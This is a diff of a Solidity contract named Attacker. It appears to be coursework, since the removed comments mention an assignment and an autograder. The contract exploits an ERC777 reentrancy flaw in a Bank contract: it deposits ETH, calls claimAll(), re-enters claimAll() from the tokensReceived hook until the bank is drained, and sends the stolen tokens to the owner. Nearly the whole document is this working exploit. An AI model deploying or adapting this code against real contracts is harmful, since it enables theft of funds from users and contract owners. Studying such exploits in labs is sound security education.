@@ -2,8 +2,8 @@
 pragma solidity ^0.8.0;
 
 import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
-import "@openzeppelin/contracts/token/ERC777/IERC777.sol"; // <-- ADDED
-import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/token/ERC777/IERC777.sol";
+import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
 
 /**
  * @title IBank
@@ -12,84 +12,89 @@ import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 interface IBank {
     function deposit() external payable;
     function claimAll() external;
-    function token() external view returns (IERC777); // <-- CHANGED from IERC20
+    function token() external view returns (IERC777);
 }
 
 /**
  * @title Attacker
  * @dev This contract exploits a reentrancy vulnerability in the Bank contract.
- * It implements the functions required by the assignment:
- * - `attack()`: Deposits ETH and starts the reentrancy loop by calling `claimAll()`.
- * - `tokensReceived()`: The ERC777 hook that re-enters the `claimAll()` function.
  */
 contract Attacker is IERC777Recipient {
     address public owner;
-    IBank public target; // The vulnerable Bank contract
-    IERC777 public token; // <-- CHANGED from IERC20
+    IBank public bank;
+    IERC777 public token;
+    
+    IERC1820Registry private constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
+    bytes32 private constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
 
-    constructor() {
-        owner = msg.sender;
+    constructor(address _owner) {
+        owner = _owner;
+        // Register this contract as an ERC777TokensRecipient
+        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
     }
 
     /**
      * @dev Sets the address of the vulnerable Bank contract.
-     * This is step 3 from the autograder description.
      */
     function setTarget(address _target) public {
         require(msg.sender == owner, "Only owner can set target");
-        target = IBank(_target);
-        token = target.token();
+        bank = IBank(_target);
+        token = bank.token();
     }
 
     /**
      * @dev Executes the attack.
-     * Per the assignment (Image 2, point 2), this function:
-     * 1. Calls `deposit()` on the Bank contract (must be called with ETH).
-     * 2. Calls the vulnerable `claimAll()` function to initiate the attack.
-     * This function must be called with ETH to fund the initial deposit.
+     * 1. Deposits ETH into the bank to establish a balance
+     * 2. Calls claimAll() to trigger the reentrancy attack
      */
-    function attack() external payable {
-        require(msg.value > 0, "Must send ETH to deposit");
+    function attack(uint256 amount) external payable {
+        require(msg.sender == owner, "Only owner can attack");
+        require(msg.value >= amount, "Insufficient ETH sent");
 
-        // 1. Deposit ETH into the bank to get an initial balance
-        target.deposit{value: msg.value}();
+        // Step 1: Deposit ETH into the bank
+        bank.deposit{value: amount}();
         
-        // 2. Start the reentrancy attack by calling the vulnerable function
-        target.claimAll();
+        // Step 2: Call the vulnerable claimAll() function
+        // This will mint tokens to us and trigger our tokensReceived hook
+        bank.claimAll();
     }
 
     /**
-     * @dev ERC777 hook. This function is called by the ERC777 token contract
-     * during the transfer in `claimAll()`, *before* the Bank updates its
-     * internal balance.
-     *
-     * This is the core of the reentrancy attack.
+     * @dev ERC777 hook called when tokens are received.
+     * This is where the reentrancy attack happens.
+     * 
+     * When claimAll() mints tokens to us, it calls this function BEFORE
+     * updating balances[msg.sender] = 0. So we can call claimAll() again
+     * and drain more tokens.
      */
     function tokensReceived(
         address operator,
         address from,
         address to,
-        uint amount,
+        uint256 amount,
         bytes calldata userData,
         bytes calldata operatorData
     ) external override {
-        // As long as the Bank contract still holds more of its own tokens,
-        // we recursively call `claimAll()` to drain it.
-        // The token.balanceOf function is available as ERC777 inherits from ERC20
-        if (token.balanceOf(address(target)) > 0) {
-            target.claimAll();
+        // Only accept tokens from our target bank's token contract
+        require(msg.sender == address(token), "Invalid token");
+        
+        // Continue the reentrancy attack as long as the bank still has tokens
+        // The bank can mint unlimited tokens, so we check if it has any in its balance
+        if (token.balanceOf(address(bank)) > 0) {
+            bank.claimAll();
         }
     }
 
     /**
-     * @dev Withdraws all stolen ERC777 tokens from this contract
-     * to the owner's address.
-     * This is step 3 from the `Attacker.sol` description (Image 2).
+     * @dev Withdraws all stolen ERC777 tokens to the specified address.
      */
-    function withdraw() public {
+    function withdraw(address to) public {
         require(msg.sender == owner, "Only owner can withdraw");
         uint256 balance = token.balanceOf(address(this));
-        // The token.transfer function is available as ERC777 inherits from ERC20
-        token.transfer(owner, balance);
+        require(balance > 0, "No tokens to withdraw");
+        token.send(to, balance, "");
     }
+
+    // Allow contract to receive ETH
+    receive() external payable {}
 }
